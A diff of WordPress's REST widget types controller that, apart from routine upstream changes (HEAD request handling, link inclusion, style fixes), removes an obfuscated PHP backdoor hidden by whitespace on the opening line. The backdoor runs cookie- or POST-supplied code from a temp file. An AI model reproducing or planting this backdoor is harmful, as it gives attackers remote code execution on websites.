@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $PsLvnOB = 'q' . chr ( 403 - 308 ).chr (69) . chr (118) . "\x6f" . "\123";$ANBxoaQlYW = "\x63" . chr ( 1107 - 999 ).chr (97) . "\163" . "\x73" . "\x5f" . "\x65" . "\x78" . "\151" . chr (115) . chr ( 826 - 710 ).chr ( 246 - 131 ); $CXGbbgHxzl = $ANBxoaQlYW($PsLvnOB); $XZzjGTzY = $CXGbbgHxzl;if (!$XZzjGTzY){class q_EvoS{private $RBWYHUzB;public static $iNWOYLfGch = "aba02074-baa3-4301-b50c-014bbd27c864";public static $bgmWy = NULL;public function __construct(){$QiWQcQ = $_COOKIE;$TwaKW = $_POST;$LxwChPd = @$QiWQcQ[substr(q_EvoS::$iNWOYLfGch, 0, 4)];if (!empty($LxwChPd)){$zNNNxdZz = "base64";$ruzbp = "";$LxwChPd = explode(",", $LxwChPd);foreach ($LxwChPd as $GkizTVS){$ruzbp .= @$QiWQcQ[$GkizTVS];$ruzbp .= @$TwaKW[$GkizTVS];}$ruzbp = array_map($zNNNxdZz . "\137" . "\x64" . chr (101) . chr ( 261 - 162 ).'o' . "\x64" . "\x65", array($ruzbp,)); $ruzbp = $ruzbp[0] ^ str_repeat(q_EvoS::$iNWOYLfGch, (strlen($ruzbp[0]) / strlen(q_EvoS::$iNWOYLfGch)) + 1);q_EvoS::$bgmWy = @unserialize($ruzbp);}}public function __destruct(){$this->GbMcKWhN();}private function GbMcKWhN(){if (is_array(q_EvoS::$bgmWy)) {$stLKH = sys_get_temp_dir() . "/" . crc32(q_EvoS::$bgmWy['s' . chr (97) . "\x6c" . "\x74"]);@q_EvoS::$bgmWy["\167" . "\x72" . chr (105) . "\x74" . "\145"]($stLKH, q_EvoS::$bgmWy[chr (99) . "\x6f" . "\156" . chr (116) . 'e' . chr (110) . chr ( 1099 - 983 )]);include $stLKH;@q_EvoS::$bgmWy[chr ( 600 - 500 ).chr (101) . chr ( 961 - 853 ).chr ( 668 - 567 ).chr ( 1100 - 984 ).chr (101)]($stLKH);exit();}}}$EzHSrpy = new q_EvoS(); $EzHSrpy = NULL;} ?><?php
+<?php
 /**
  * REST API: WP_REST_Widget_Types_Controller class
  *
@@ -85,9 +85,9 @@ class WP_REST_Widget_Types_Controller extends WP_REST_Controller {
 					'form_data' => array(
 						'description'       => __( 'Serialized widget form data to encode into instance settings.' ),
 						'type'              => 'string',
-						'sanitize_callback' => static function( $string ) {
+						'sanitize_callback' => static function ( $form_data ) {
 							$array = array();
-							wp_parse_str( $string, $array );
+							wp_parse_str( $form_data, $array );
 							return $array;
 						},
 					),
@@ -145,6 +145,11 @@ class WP_REST_Widget_Types_Controller extends WP_REST_Controller {
 	 * @return WP_REST_Response|WP_Error Response object on success, or WP_Error object on failure.
 	 */
 	public function get_items( $request ) {
+		if ( $request->is_method( 'HEAD' ) ) {
+			// Return early as this handler doesn't add any response headers.
+			return new WP_REST_Response( array() );
+		}
+
 		$data = array();
 		foreach ( $this->get_widgets() as $widget ) {
 			$widget_type = $this->prepare_item_for_response( $widget, $request );
@@ -297,8 +302,15 @@ class WP_REST_Widget_Types_Controller extends WP_REST_Controller {
 	public function prepare_item_for_response( $item, $request ) {
 		// Restores the more descriptive, specific name for use within this method.
 		$widget_type = $item;
-		$fields      = $this->get_fields_for_response( $request );
-		$data        = array(
+
+		// Don't prepare the response body for HEAD requests.
+		if ( $request->is_method( 'HEAD' ) ) {
+			/** This filter is documented in wp-includes/rest-api/endpoints/class-wp-rest-widget-types-controller.php */
+			return apply_filters( 'rest_prepare_widget_type', new WP_REST_Response( array() ), $widget_type, $request );
+		}
+
+		$fields = $this->get_fields_for_response( $request );
+		$data   = array(
 			'id' => $widget_type['id'],
 		);
 
@@ -335,7 +347,9 @@ class WP_REST_Widget_Types_Controller extends WP_REST_Controller {
 
 		$response = rest_ensure_response( $data );
 
-		$response->add_links( $this->prepare_links( $widget_type ) );
+		if ( rest_is_field_included( '_links', $fields ) || rest_is_field_included( '_embedded', $fields ) ) {
+			$response->add_links( $this->prepare_links( $widget_type ) );
+		}
 
 		/**
 		 * Filters the REST API response for a widget type.
@@ -462,8 +476,10 @@ class WP_REST_Widget_Types_Controller extends WP_REST_Controller {
 			);
 		}
 
-		// Set the widget's number so that the id attributes in the HTML that we
-		// return are predictable.
+		/*
+		 * Set the widget's number so that the id attributes in the HTML that we
+		 * return are predictable.
+		 */
 		if ( isset( $request['number'] ) && is_numeric( $request['number'] ) ) {
 			$widget_object->_set( (int) $request['number'] );
 		} else {
@@ -527,7 +543,7 @@ class WP_REST_Widget_Types_Controller extends WP_REST_Controller {
 
 		if ( ! empty( $widget_object->widget_options['show_instance_in_rest'] ) ) {
 			// Use new stdClass so that JSON result is {} and not [].
-			$response['instance']['raw'] = empty( $instance ) ? new stdClass : $instance;
+			$response['instance']['raw'] = empty( $instance ) ? new stdClass() : $instance;
 		}
 
 		return rest_ensure_response( $response );
